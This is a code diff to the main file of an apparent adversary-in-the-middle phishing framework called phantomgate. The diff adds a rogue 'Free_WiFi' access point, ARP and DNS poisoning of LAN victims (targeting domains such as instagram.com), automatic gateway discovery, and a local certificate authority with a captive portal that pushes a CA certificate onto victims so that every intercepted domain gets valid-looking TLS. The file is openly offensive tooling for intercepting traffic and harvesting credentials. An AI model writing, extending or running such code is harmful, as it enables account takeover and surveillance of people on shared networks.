@@ -12,12 +12,14 @@ import (
 	"strings"
 	"syscall"
 
-	"github.com/phantomgate/phantomgate/internal/capture"
+	"github.com/phantomgate/phantomgate/internal/certgen"
 	"github.com/phantomgate/phantomgate/internal/config"
 	"github.com/phantomgate/phantomgate/internal/dashboard"
 	pgdns "github.com/phantomgate/phantomgate/internal/dns"
 	"github.com/phantomgate/phantomgate/internal/lure"
+	"github.com/phantomgate/phantomgate/internal/network"
 	"github.com/phantomgate/phantomgate/internal/phishlet"
+	"github.com/phantomgate/phantomgate/internal/portal"
 	"github.com/phantomgate/phantomgate/internal/proxy"
 	"github.com/phantomgate/phantomgate/internal/store"
 )
@@ -61,14 +63,47 @@ func main() {
 
 	// DNS Interception flags
 	intercept := flag.Bool("intercept", false, "Enable DNS interception mode (ARP + DNS poisoning on LAN)")
+	wizardMode := flag.Bool("wizard", false, "Launch interactive wizard for LAN interception setup")
 	ifaceName := flag.String("iface", "eth0", "Network interface for interception")
 	gatewayIP := flag.String("gateway", "", "Gateway IP for ARP poisoning")
 	victimIPs := flag.String("victim-ip", "", "Comma-separated victim IPs (empty = entire subnet)")
 	poisonDomains := flag.String("poison-domain", "", "Comma-separated domains to poison (e.g., instagram.com,facebook.com)")
 
+	// Rogue AP flags
+	rogueAP := flag.Bool("rogue-ap", false, "Create a rogue WiFi access point (bypasses AP isolation)")
+	apSSID := flag.String("ap-ssid", "Free_WiFi", "SSID for the rogue AP")
+	apPassword := flag.String("ap-pass", "", "WPA2 password for rogue AP (empty = open)")
+	apChannel := flag.Int("ap-channel", 6, "WiFi channel for rogue AP")
+	apIface := flag.String("ap-iface", "", "WiFi interface for AP (auto-detected if empty)")
+
+	// Dynamic CA flags
+	useCA := flag.Bool("use-ca", false, "Generate dynamic TLS certificates signed by a local CA")
+	captivePortalFlag := flag.Bool("captive-portal", false, "Enable captive portal for CA cert distribution")
+
 	flag.Parse()
 
 	fmt.Print(banner)
+
+	// Interactive wizard mode for LAN interception
+	if *wizardMode {
+		result, err := pgdns.RunWizard()
+		if err != nil {
+			log.Fatalf("[FATAL] Wizard aborted: %v", err)
+		}
+		// Apply wizard results to flags
+		*intercept = true
+		*ifaceName = result.Network.Interface
+		*gatewayIP = result.Network.GatewayIP
+		if len(result.TargetDomains) > 0 {
+			*poisonDomains = strings.Join(result.TargetDomains, ",")
+		}
+		if len(result.VictimIPs) > 0 {
+			*victimIPs = strings.Join(result.VictimIPs, ",")
+		}
+		if result.Phishlet != "" && *phishletName == "" {
+			*phishletName = result.Phishlet
+		}
+	}
 
 	// Load configuration
 	cfg, err := config.LoadConfig(*configFile)
@@ -123,9 +158,14 @@ func main() {
 		os.Exit(0)
 	}
 
-	// Validate required flags
+	// Validate required flags — in intercept mode, domain defaults to test.local
 	if cfg.Domain == "" {
-		log.Fatal("[FATAL] --domain is required. Example: --domain login-secure.com")
+		if *intercept {
+			cfg.Domain = "test.local"
+			log.Println("[*] No --domain specified, using 'test.local' for LAN interception")
+		} else {
+			log.Fatal("[FATAL] --domain is required. Example: --domain login-secure.com")
+		}
 	}
 	if *phishletName == "" {
 		log.Fatal("[FATAL] --phishlet is required. Use --list to see available phishlets.")
@@ -150,8 +190,58 @@ func main() {
 		fmt.Printf("      URL: %s\n\n", lureGen.GetURL(newLure))
 	}
 
+	// === ROGUE AP MODE ===
+	var rogueAPInstance *network.RogueAP
+	if *rogueAP {
+		apCfg := network.DefaultRogueAPConfig()
+		apCfg.SSID = *apSSID
+		apCfg.Password = *apPassword
+		apCfg.Channel = *apChannel
+		if *apIface != "" {
+			apCfg.Interface = *apIface
+		}
+
+		var err error
+		rogueAPInstance, err = network.NewRogueAP(apCfg)
+		if err != nil {
+			log.Fatalf("[FATAL] Rogue AP setup failed: %v", err)
+		}
+
+		if err := rogueAPInstance.Start(); err != nil {
+			log.Fatalf("[FATAL] Rogue AP start failed: %v", err)
+		}
+
+		// In rogue AP mode, we ARE the gateway — override network settings
+		*intercept = true
+		*gatewayIP = rogueAPInstance.GetGatewayIP()
+		*ifaceName = rogueAPInstance.GetInterface()
+
+		// Enable CA + captive portal by default in rogue AP mode
+		*useCA = true
+		*captivePortalFlag = true
+	}
+
+	// === DYNAMIC CA ===
+	var phantomCA *certgen.PhantomCA
+	if *useCA || *rogueAP {
+		dataDir := "data"
+		os.MkdirAll(dataDir, 0755)
+		var err error
+		phantomCA, err = certgen.NewPhantomCA(dataDir)
+		if err != nil {
+			log.Fatalf("[FATAL] CA generation failed: %v", err)
+		}
+		log.Printf("[CA] Dynamic TLS certificates enabled — all domains get valid-looking certs")
+		log.Printf("[CA] CA cert for victim installation: %s", phantomCA.CACertPath())
+	}
+
 	// Initialize the AiTM reverse proxy
-	phantomProxy := proxy.NewPhantomProxy(cfg, activePhishlet, dataStore)
+	phantomProxy := proxy.NewPhantomProxy(cfg, activePhishlet, dataStore, lureGen)
+
+	// Apply CA-based TLS if enabled
+	if phantomCA != nil {
+		phantomProxy.SetCustomTLS(phantomCA.GetTLSConfig())
+	}
 
 	// Print startup info
 	fmt.Println("\n  ┌─────────────────────────────────────────────┐")
@@ -228,8 +318,24 @@ func main() {
 	// === DNS INTERCEPTION MODE ===
 	var interceptSuite *pgdns.InterceptSuite
 	if *intercept {
+		// Auto-detect network if gateway/interface not provided
+		var netInfo *pgdns.NetworkInfo
 		if *gatewayIP == "" {
-			log.Fatal("[FATAL] --gateway is required for interception mode")
+			log.Println("[*] Auto-detecting network configuration...")
+			var err error
+			netInfo, err = pgdns.AutoDiscover()
+			if err != nil {
+				log.Fatalf("[FATAL] Network auto-detection failed: %v\n    Use --gateway and --iface to set manually.", err)
+			}
+			*gatewayIP = netInfo.GatewayIP
+			*ifaceName = netInfo.Interface
+
+			ifType := "wired"
+			if netInfo.IsWireless {
+				ifType = "wireless"
+			}
+			log.Printf("[+] Detected network: %s (%s) | IP: %s | Gateway: %s",
+				netInfo.Interface, ifType, netInfo.LocalIP, netInfo.GatewayIP)
 		}
 
 		// Parse victim IPs
@@ -247,7 +353,6 @@ func main() {
 				domains = append(domains, strings.TrimSpace(d))
 			}
 		} else {
-			// Auto-detect from phishlet
 			for _, h := range activePhishlet.ProxyHosts {
 				domains = append(domains, h.OrigSub)
 			}
@@ -256,9 +361,9 @@ func main() {
 		// Determine our IP for redirection
 		redirectIP := cfg.ListenIP
 		if redirectIP == "0.0.0.0" {
-			// Try to get the IP of the specified interface
-			redirectIP = *gatewayIP // Fallback; will be overridden
-			if iface, err := net.InterfaceByName(*ifaceName); err == nil {
+			if netInfo != nil {
+				redirectIP = netInfo.LocalIP
+			} else if iface, err := net.InterfaceByName(*ifaceName); err == nil {
 				if addrs, err := iface.Addrs(); err == nil {
 					for _, addr := range addrs {
 						if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
@@ -292,7 +397,7 @@ func main() {
 	if *intercept {
 		fmt.Println("  ☠️  DNS interception mode ACTIVE — victims' DNS is being poisoned")
 	}
-	fmt.Println("  Press Ctrl+C to shutdown.\n")
+	fmt.Println("  Press Ctrl+C to shutdown.")
 
 	// Graceful shutdown
 	sigChan := make(chan os.Signal, 1)
@@ -306,8 +411,6 @@ func main() {
 		interceptSuite.Stop()
 	}
 
-	fmt.Println("  [✓] All data saved. Goodbye.\n")
+	fmt.Println("  [✓] All data saved. Goodbye.")
 }
 
-// Silence unused import warnings
-var _ = capture.ReadBody
